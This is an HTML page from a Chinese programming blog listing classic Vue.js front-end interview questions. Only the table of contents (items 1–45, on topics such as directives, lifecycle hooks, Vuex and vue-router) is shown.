<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>前端vue经典面试题78道（重点详细简洁） - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">前端vue经典面试题78道（重点详细简洁）</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:40px"></p> 
<p id="1.%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D-toc" style="margin-left:40px"><a href="#1.%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D">1.自我介绍</a></p> 
<p id="2.vue%E9%9D%A2%E8%AF%95%E9%A2%98-toc" style="margin-left:0px"><a href="#2.vue%E9%9D%A2%E8%AF%95%E9%A2%98">2.vue面试题</a></p> 
<p id="1.v-show%E5%92%8Cv-if%E5%8C%BA%E5%88%AB%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9A-toc" style="margin-left:40px"><a href="#1.v-show%E5%92%8Cv-if%E5%8C%BA%E5%88%AB%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9A">1.v-show和v-if区别的区别：</a></p> 
<p id="2.%E4%B8%BA%E4%BD%95v-for%E8%A6%81%E7%94%A8key-toc" style="margin-left:40px"><a href="#2.%E4%B8%BA%E4%BD%95v-for%E8%A6%81%E7%94%A8key">2.为何v-for要用key</a></p> 
<p id="3.%E6%8F%8F%E8%BF%B0vue%E7%BB%84%E4%BB%B6%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9Fmm-toc" style="margin-left:40px"><a href="#3.%E6%8F%8F%E8%BF%B0vue%E7%BB%84%E4%BB%B6%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9Fmm">3.描述vue组件声明周期mm</a></p> 
<p id="%E5%8D%95%E7%BB%84%E4%BB%B6%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F%E5%9B%BE-toc" style="margin-left:80px"><a href="#%E5%8D%95%E7%BB%84%E4%BB%B6%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F%E5%9B%BE">单组件声明周期图</a></p> 
<p id="%E2%80%8B%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE-toc" style="margin-left:80px"><a href="#%E2%80%8B%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE">​父子组件生命周期图</a></p> 
<p id="4.vue%E7%BB%84%E4%BB%B6%E5%A6%82%E4%BD%95%E9%80%9A%E4%BF%A1-toc" style="margin-left:40px"><a href="#4.vue%E7%BB%84%E4%BB%B6%E5%A6%82%E4%BD%95%E9%80%9A%E4%BF%A1">4.vue组件如何通信</a></p> 
<p id="5.%E6%8F%8F%E8%BF%B0%E7%BB%84%E4%BB%B6%E6%B8%B2%E6%9F%93%E5%92%8C%E6%9B%B4%E6%96%B0%E7%9A%84%E8%BF%87%E7%A8%8B-toc" style="margin-left:40px"><a href="#5.%E6%8F%8F%E8%BF%B0%E7%BB%84%E4%BB%B6%E6%B8%B2%E6%9F%93%E5%92%8C%E6%9B%B4%E6%96%B0%E7%9A%84%E8%BF%87%E7%A8%8B">5.描述组件渲染和更新的过程</a></p> 
<p id="1%E3%80%81vue%20%E7%BB%84%E4%BB%B6%E5%88%9D%E6%AC%A1%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B-toc" style="margin-left:80px"><a href="#1%E3%80%81vue%20%E7%BB%84%E4%BB%B6%E5%88%9D%E6%AC%A1%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B">1、vue 组件初次渲染过程</a></p> 
<p id="2%E3%80%81vue%20%E7%BB%84%E4%BB%B6%E6%9B%B4%E6%96%B0%E8%BF%87%E7%A8%8B-toc" style="margin-left:80px"><a href="#2%E3%80%81vue%20%E7%BB%84%E4%BB%B6%E6%9B%B4%E6%96%B0%E8%BF%87%E7%A8%8B">2、vue 组件更新过程</a></p> 
<p id="6.%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9Av-model%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86-toc" style="margin-left:40px"><a href="#6.%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9Av-model%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86">6.双向数据绑定v-model的实现原理</a></p> 
<p id="7.%E5%AF%B9mvvm%E7%9A%84%E7%90%86%E8%A7%A3-toc" style="margin-left:40px"><a href="#7.%E5%AF%B9mvvm%E7%9A%84%E7%90%86%E8%A7%A3">7.对mvvm的理解</a></p> 
<p id="8.computed%E6%9C%89%E4%BD%95%E7%89%B9%E6%80%A7-toc" style="margin-left:40px"><a href="#8.computed%E6%9C%89%E4%BD%95%E7%89%B9%E6%80%A7">8.computed有何特性</a></p> 
<p id="9.VUE%20%E4%B8%AD%E5%A6%82%E4%BD%95%E5%B0%81%E8%A3%85%E7%BB%84%E4%BB%B6%EF%BC%9F%E4%BB%80%E4%B9%88%E7%BB%84%E4%BB%B6%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%B0%81%E8%A3%85%E7%BB%84%E4%BB%B6%EF%BC%9F%E7%BB%84%E4%BB%B6%E4%B8%AD%20data%20%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%9F-toc" style="margin-left:40px"><a href="#9.VUE%20%E4%B8%AD%E5%A6%82%E4%BD%95%E5%B0%81%E8%A3%85%E7%BB%84%E4%BB%B6%EF%BC%9F%E4%BB%80%E4%B9%88%E7%BB%84%E4%BB%B6%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%B0%81%E8%A3%85%E7%BB%84%E4%BB%B6%EF%BC%9F%E7%BB%84%E4%BB%B6%E4%B8%AD%20data%20%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%9F">9.VUE 中如何封装组件？什么组件，为什么要封装组件？组件中 data 为什么是一个函数？</a></p> 
<p id="%C2%A0%C2%A0%C2%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%B0%81%E8%A3%85%E7%BB%84%E4%BB%B6%EF%BC%9F-toc" style="margin-left:80px"><a href="#%C2%A0%C2%A0%C2%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%B0%81%E8%A3%85%E7%BB%84%E4%BB%B6%EF%BC%9F">   为什么要封装组件？</a></p> 
<p id="%E3%80%80%E3%80%80%E4%BB%80%E4%B9%88%E6%98%AF%E7%BB%84%E4%BB%B6%EF%BC%9F-toc" style="margin-left:80px"><a href="#%E3%80%80%E3%80%80%E4%BB%80%E4%B9%88%E6%98%AF%E7%BB%84%E4%BB%B6%EF%BC%9F">　　什么是组件？</a></p> 
<p id="10.ajax%E8%AF%B7%E6%B1%82%E5%BA%94%E8%AF%A5%E6%94%BE%E5%9C%A8%E5%93%AA%E4%B8%AA%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%EF%BC%9F-toc" style="margin-left:40px"><a href="#10.ajax%E8%AF%B7%E6%B1%82%E5%BA%94%E8%AF%A5%E6%94%BE%E5%9C%A8%E5%93%AA%E4%B8%AA%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%EF%BC%9F">10.ajax请求应该放在哪个生命周期？</a></p> 
<p id="11.%E5%A6%82%E4%BD%95%E5%B0%86%E7%BB%84%E4%BB%B6%E6%89%80%E6%9C%89props%E4%BC%A0%E9%80%92%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6%EF%BC%9F-toc" style="margin-left:40px"><a href="#11.%E5%A6%82%E4%BD%95%E5%B0%86%E7%BB%84%E4%BB%B6%E6%89%80%E6%9C%89props%E4%BC%A0%E9%80%92%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6%EF%BC%9F">11.如何将组件所有props传递给子组件？</a></p> 
<p id="12.%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E5%AE%9E%E7%8E%B0v-model%3F-toc" style="margin-left:40px"><a href="#12.%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E5%AE%9E%E7%8E%B0v-model%3F">12.如何自定实现v-model?</a></p> 
<p id="13.%E5%A4%9A%E4%B8%AA%E7%BB%84%E4%BB%B6%E6%9C%89%E7%9B%B8%E5%90%8C%E9%80%BB%E8%BE%91%EF%BC%8C%E5%A6%82%E4%BD%95%E6%8A%BD%E7%A6%BB%EF%BC%9F-toc" style="margin-left:40px"><a href="#13.%E5%A4%9A%E4%B8%AA%E7%BB%84%E4%BB%B6%E6%9C%89%E7%9B%B8%E5%90%8C%E9%80%BB%E8%BE%91%EF%BC%8C%E5%A6%82%E4%BD%95%E6%8A%BD%E7%A6%BB%EF%BC%9F">13.多个组件有相同逻辑，如何抽离？</a></p> 
<p id="14.%E4%BD%95%E6%97%B6%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BC%82%E6%AD%A5%E7%BB%84%E4%BB%B6%EF%BC%9F-toc" style="margin-left:40px"><a href="#14.%E4%BD%95%E6%97%B6%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BC%82%E6%AD%A5%E7%BB%84%E4%BB%B6%EF%BC%9F">14.何时要使用异步组件？</a></p> 
<p id="15.%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8keep-alive%EF%BC%9F-toc" style="margin-left:40px"><a href="#15.%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8keep-alive%EF%BC%9F">15.何时使用keep-alive？</a></p> 
<p id="16.%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8beforeDestroy%EF%BC%9F-toc" style="margin-left:40px"><a href="#16.%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8beforeDestroy%EF%BC%9F">16.何时使用beforeDestroy？</a></p> 
<p id="17.%E4%BB%80%E4%B9%88%E6%98%AF%E4%BD%9C%E7%94%A8%E5%9F%9F%E6%8F%92%E6%A7%BD%EF%BC%9F-toc" style="margin-left:40px"><a href="#17.%E4%BB%80%E4%B9%88%E6%98%AF%E4%BD%9C%E7%94%A8%E5%9F%9F%E6%8F%92%E6%A7%BD%EF%BC%9F">17.什么是作用域插槽？</a></p> 
<p id="18.vuex%E4%B8%ADaction%E5%92%8Cmutation%E6%9C%89%E4%BD%95%E5%8C%BA%E5%88%AB%EF%BC%9F-toc" style="margin-left:40px"><a href="#18.vuex%E4%B8%ADaction%E5%92%8Cmutation%E6%9C%89%E4%BD%95%E5%8C%BA%E5%88%AB%EF%BC%9F">18.vuex中action和mutation有何区别？</a></p> 
<p id="19.vue-router%E5%B8%B8%E7%94%A8%E8%B7%AF%E7%94%B1%E6%A8%A1%E5%BC%8F-toc" style="margin-left:40px"><a href="#19.vue-router%E5%B8%B8%E7%94%A8%E8%B7%AF%E7%94%B1%E6%A8%A1%E5%BC%8F">19.vue-router常用路由模式</a></p> 
<p id="20.%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AEvue-router%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD-toc" style="margin-left:40px"><a href="#20.%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AEvue-router%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD">20.如何配置vue-router异步加载</a></p> 
<p id="21.%E8%AF%B7%E7%94%A8vnode%E6%8F%8F%E8%BF%B0%E4%B8%80%E4%B8%AAdom%E7%BB%93%E6%9E%84-toc" style="margin-left:40px"><a href="#21.%E8%AF%B7%E7%94%A8vnode%E6%8F%8F%E8%BF%B0%E4%B8%80%E4%B8%AAdom%E7%BB%93%E6%9E%84">21.请用vnode描述一个dom结构</a></p> 
<p id="22.%E7%9B%91%E5%90%ACdata%E5%8F%98%E5%8C%96%E7%9A%84%E6%A0%B8%E5%BF%83api%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F-toc" style="margin-left:40px"><a href="#22.%E7%9B%91%E5%90%ACdata%E5%8F%98%E5%8C%96%E7%9A%84%E6%A0%B8%E5%BF%83api%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F">22.监听data变化的核心api是什么？</a></p> 
<p id="23.vue%E5%A6%82%E4%BD%95%E7%9B%91%E5%90%AC%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96%EF%BC%9F-toc" style="margin-left:40px"><a href="#23.vue%E5%A6%82%E4%BD%95%E7%9B%91%E5%90%AC%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96%EF%BC%9F">23.vue如何监听数据变化？</a></p> 
<p id="24.%E8%AF%B7%E6%8F%8F%E8%BF%B0%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%EF%BC%9F-toc" style="margin-left:40px"><a href="#24.%E8%AF%B7%E6%8F%8F%E8%BF%B0%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%EF%BC%9F">24.请描述响应式原理？</a></p> 
<p id="25.%E7%AE%80%E8%BF%B0diff%E7%AE%97%E6%B3%95%E8%BF%87%E7%A8%8B%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89-toc" style="margin-left:40px"><a href="#25.%E7%AE%80%E8%BF%B0diff%E7%AE%97%E6%B3%95%E8%BF%87%E7%A8%8B%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89">25.简述diff算法过程（了解）</a></p> 
<p id="26.vue%E4%B8%BA%E4%BD%95%E6%98%AF%E5%BC%82%E6%AD%A5%E6%B8%B2%E6%9F%93%EF%BC%8C%24nextTick%E4%BD%95%E7%94%A8%EF%BC%9F-toc" style="margin-left:40px"><a href="#26.vue%E4%B8%BA%E4%BD%95%E6%98%AF%E5%BC%82%E6%AD%A5%E6%B8%B2%E6%9F%93%EF%BC%8C%24nextTick%E4%BD%95%E7%94%A8%EF%BC%9F">26.vue为何是异步渲染，$nextTick何用？</a></p> 
<p id="27.vue%E5%B8%B8%E8%A7%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%96%B9%E5%BC%8F%EF%BC%9F-toc" style="margin-left:40px"><a href="#27.vue%E5%B8%B8%E8%A7%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%96%B9%E5%BC%8F%EF%BC%9F">27.vue常见性能优化方式？</a></p> 
<p id="1.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8v-if%E5%92%8Cv-show%EF%BC%8C-toc" style="margin-left:80px"><a href="#1.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8v-if%E5%92%8Cv-show%EF%BC%8C">1.合理使用v-if和v-show，</a></p> 
<p id="2.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8computed%EF%BC%8C-toc" style="margin-left:80px"><a href="#2.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8computed%EF%BC%8C">2.合理使用computed，</a></p> 
<p id="3.v-for%E5%8A%A0key%EF%BC%8C-toc" style="margin-left:80px"><a href="#3.v-for%E5%8A%A0key%EF%BC%8C">3.v-for加key，</a></p> 
<p id="4.%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%EF%BC%8Cdom%E4%BA%8B%E4%BB%B6%E5%8F%8A%E6%97%B6%E9%94%80%E6%AF%81%EF%BC%8C-toc" style="margin-left:80px"><a href="#4.%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%EF%BC%8Cdom%E4%BA%8B%E4%BB%B6%E5%8F%8A%E6%97%B6%E9%94%80%E6%AF%81%EF%BC%8C">4.自定义事件，dom事件及时销毁，</a></p> 
<p id="5.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8%E5%BC%82%E6%AD%A5%E7%BB%84%E4%BB%B6%EF%BC%8C-toc" style="margin-left:80px"><a href="#5.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8%E5%BC%82%E6%AD%A5%E7%BB%84%E4%BB%B6%EF%BC%8C">5.合理使用异步组件，</a></p> 
<p id="6.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8keepalive%EF%BC%8C-toc" style="margin-left:80px"><a href="#6.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8keepalive%EF%BC%8C">6.合理使用keepalive，</a></p> 
<p id="7.data%E5%B1%82%E7%BA%A7%E4%B8%8D%E8%A6%81%E5%A4%AA%E6%B7%B1%EF%BC%8C-toc" style="margin-left:80px"><a href="#7.data%E5%B1%82%E7%BA%A7%E4%B8%8D%E8%A6%81%E5%A4%AA%E6%B7%B1%EF%BC%8C">7.data层级不要太深，</a></p> 
<p id="8.%E4%BD%BF%E7%94%A8vue-loader%E5%9C%A8%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%81%9A%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%AF%91%EF%BC%8C-toc" style="margin-left:80px"><a href="#8.%E4%BD%BF%E7%94%A8vue-loader%E5%9C%A8%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%81%9A%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%AF%91%EF%BC%8C">8.使用vue-loader在开发环境做模板编译，</a></p> 
<p id="9.%E5%89%8D%E7%AB%AF%E9%80%9A%E7%94%A8%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E5%A6%82%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD%2F%E5%87%8F%E5%B0%91%20HTTP%E8%AF%B7%E6%B1%82%E6%95%B0%2F%E5%90%88%E7%90%86%E8%AE%BE%E7%BD%AE%20HTTP%E7%BC%93%E5%AD%98%2F%E8%B5%84%E6%BA%90%E5%90%88%E5%B9%B6%E4%B8%8E%E5%8E%8B%E7%BC%A9%2F%E5%90%88%E5%B9%B6%20CSS%E5%9B%BE%E7%89%87%2F%E5%B0%86%20CSS%E6%94%BE%E5%9C%A8%20head%E4%B8%AD%2F%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82%2F%E5%88%87%E5%88%86%E5%88%B0%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%89%EF%BC%8C-toc" style="margin-left:80px"><a href="#9.%E5%89%8D%E7%AB%AF%E9%80%9A%E7%94%A8%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E5%A6%82%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD%2F%E5%87%8F%E5%B0%91%20HTTP%E8%AF%B7%E6%B1%82%E6%95%B0%2F%E5%90%88%E7%90%86%E8%AE%BE%E7%BD%AE%20HTTP%E7%BC%93%E5%AD%98%2F%E8%B5%84%E6%BA%90%E5%90%88%E5%B9%B6%E4%B8%8E%E5%8E%8B%E7%BC%A9%2F%E5%90%88%E5%B9%B6%20CSS%E5%9B%BE%E7%89%87%2F%E5%B0%86%20CSS%E6%94%BE%E5%9C%A8%20head%E4%B8%AD%2F%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82%2F%E5%88%87%E5%88%86%E5%88%B0%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%89%EF%BC%8C">9.前端通用性能优化（如图片懒加载/减少 HTTP请求数/合理设置 HTTP缓存/资源合并与压缩/合并 CSS图片/将 CSS放在 head中/避免重复的资源请求/切分到多个域名），</a></p> 
<p id="10.%E4%BD%BF%E7%94%A8ssr-toc" style="margin-left:80px"><a href="#10.%E4%BD%BF%E7%94%A8ssr">10.使用ssr</a></p> 
<p id="28%E3%80%81VUEX%20%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E6%80%8E%E4%B9%88%E4%BD%BF%E7%94%A8%EF%BC%9F%E9%82%A3%E7%A7%8D%E5%9C%BA%E5%90%88%E8%83%BD%E7%94%A8%EF%BC%9F-toc" style="margin-left:40px"><a href="#28%E3%80%81VUEX%20%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E6%80%8E%E4%B9%88%E4%BD%BF%E7%94%A8%EF%BC%9F%E9%82%A3%E7%A7%8D%E5%9C%BA%E5%90%88%E8%83%BD%E7%94%A8%EF%BC%9F">28、VUEX 是什么？怎么使用？那种场合能用？</a></p> 
<p id="29%E3%80%81vue%20%E7%9A%84%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95-toc" style="margin-left:40px"><a href="#29%E3%80%81vue%20%E7%9A%84%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95">29、vue 的指令用法</a></p> 
<p id="30%E3%80%81vue.js%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F-toc" style="margin-left:40px"><a href="#30%E3%80%81vue.js%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F">30、vue.js的两个核心是什么？</a></p> 
<p id="31.vue%E4%B8%AD%E5%AD%90%E7%BB%84%E4%BB%B6%E8%B0%83%E7%94%A8%E7%88%B6%E7%BB%84%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%3F-toc" style="margin-left:40px"><a href="#31.vue%E4%B8%AD%E5%AD%90%E7%BB%84%E4%BB%B6%E8%B0%83%E7%94%A8%E7%88%B6%E7%BB%84%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%3F">31.vue中子组件调用父组件的方法?</a></p> 
<p id="32.vue%E4%B8%AD%E7%88%B6%E7%BB%84%E4%BB%B6%E8%B0%83%E7%94%A8%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%3F-toc" style="margin-left:40px"><a href="#32.vue%E4%B8%AD%E7%88%B6%E7%BB%84%E4%BB%B6%E8%B0%83%E7%94%A8%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%3F">32.vue中父组件调用子组件的方法?</a></p> 
<p id="33.vue%E9%A1%B5%E9%9D%A2%E7%BA%A7%E7%BB%84%E4%BB%B6%E4%B9%8B%E9%97%B4%E4%BC%A0%E5%80%BC%3F-toc" style="margin-left:40px"><a href="#33.vue%E9%A1%B5%E9%9D%A2%E7%BA%A7%E7%BB%84%E4%BB%B6%E4%B9%8B%E9%97%B4%E4%BC%A0%E5%80%BC%3F">33.vue页面级组件之间传值?</a></p> 
<p id="34.%E8%AF%B4%E8%AF%B4vue%E7%9A%84%E5%8A%A8%E6%80%81%E7%BB%84%E4%BB%B6%E3%80%82-toc" style="margin-left:40px"><a href="#34.%E8%AF%B4%E8%AF%B4vue%E7%9A%84%E5%8A%A8%E6%80%81%E7%BB%84%E4%BB%B6%E3%80%82">34.说说vue的动态组件。</a></p> 
<p id="35.%24route%E5%92%8C%20%24router%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F-toc" style="margin-left:40px"><a href="#35.%24route%E5%92%8C%20%24router%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F">35.$route和 $router的区别是什么？</a></p> 
<p id="36.%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8vue%E5%BC%80%E5%8F%91%EF%BC%9F-toc" style="margin-left:40px"><a href="#36.%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8vue%E5%BC%80%E5%8F%91%EF%BC%9F">36.为什么使用vue开发？</a></p> 
<p id="37.vue%E5%92%8Creact%20%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F-toc" style="margin-left:40px"><a href="#37.vue%E5%92%8Creact%20%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F">37.vue和react 有什么区别？</a></p> 
<p id="38.Vuex%E5%92%8CRedux%E7%9A%84%E5%8C%BA%E5%88%AB-toc" style="margin-left:40px"><a href="#38.Vuex%E5%92%8CRedux%E7%9A%84%E5%8C%BA%E5%88%AB">38.Vuex和Redux的区别</a></p> 
<p id="mvvm%E5%92%8Cmvc%E7%90%86%E8%A7%A3%20%E4%B8%8E%E5%8C%BA%E5%88%AB%EF%BC%9F-toc" style="margin-left:80px"><a href="#mvvm%E5%92%8Cmvc%E7%90%86%E8%A7%A3%20%E4%B8%8E%E5%8C%BA%E5%88%AB%EF%BC%9F">mvvm和mvc理解 与区别？</a></p> 
<p id="39.%E8%AF%B4%E4%B8%80%E4%B8%8Bvue%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%2F%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F-toc" style="margin-left:40px"><a href="#39.%E8%AF%B4%E4%B8%80%E4%B8%8Bvue%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%2F%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F">39.说一下vue的生命周期/钩子函数都有哪些？</a></p> 
<p id="40.%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E7%9A%84%E7%90%86%E8%A7%A3%EF%BC%9F-toc" style="margin-left:40px"><a href="#40.%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E7%9A%84%E7%90%86%E8%A7%A3%EF%BC%9F">40.双向数据绑定的理解？</a></p> 
<p id="41.vue%E7%BB%84%E4%BB%B6%E4%B8%ADdata%E4%B8%BA%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1-toc" style="margin-left:40px"><a href="#41.vue%E7%BB%84%E4%BB%B6%E4%B8%ADdata%E4%B8%BA%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1">41.vue组件中data为什么函数返回一个对象</a></p> 
<p id="42.vue%E4%B8%AD%E5%93%AA%E4%BA%9B%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%AF%B9%E6%95%B0%E7%BB%84%E4%BF%AE%E6%94%B9%E5%AE%9E%E7%8E%B0%E8%A7%86%E5%9B%BE%E6%9B%B4%E6%96%B0-toc" style="margin-left:40px"><a href="#42.vue%E4%B8%AD%E5%93%AA%E4%BA%9B%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%AF%B9%E6%95%B0%E7%BB%84%E4%BF%AE%E6%94%B9%E5%AE%9E%E7%8E%B0%E8%A7%86%E5%9B%BE%E6%9B%B4%E6%96%B0">42.vue中哪些数组方法可以直接对数组修改实现视图更新</a></p> 
<p id="43.%E6%9C%89%E5%93%AA%E4%BA%9B%E6%8C%87%E4%BB%A4%EF%BC%9Fv-if%E5%92%8Cv-show%E5%8C%BA%E5%88%AB%EF%BC%8Cv-if%E3%80%81v-for%E4%BC%98%E5%85%88%E7%BA%A7-toc" style="margin-left:40px"><a href="#43.%E6%9C%89%E5%93%AA%E4%BA%9B%E6%8C%87%E4%BB%A4%EF%BC%9Fv-if%E5%92%8Cv-show%E5%8C%BA%E5%88%AB%EF%BC%8Cv-if%E3%80%81v-for%E4%BC%98%E5%85%88%E7%BA%A7">43.有哪些指令？v-if和v-show区别，v-if、v-for优先级</a></p> 
<p id="44.v-for%E4%B8%ADkey%20%E7%9A%84%E4%BD%9C%E7%94%A8-toc" style="margin-left:40px"><a href="#44.v-for%E4%B8%ADkey%20%E7%9A%84%E4%BD%9C%E7%94%A8">44.v-for中key 的作用</a></p> 
<p id="45.%E4%BD%BF%E7%94%A8%E8%BF%87keep-alive%E5%90%97-toc" style="margin-left:40px"><a href="#45.%E4%BD%BF%E7%94%A8%E8%BF%87keep-alive%E5%90%97">45.使用过keep-alive吗</a></p> 
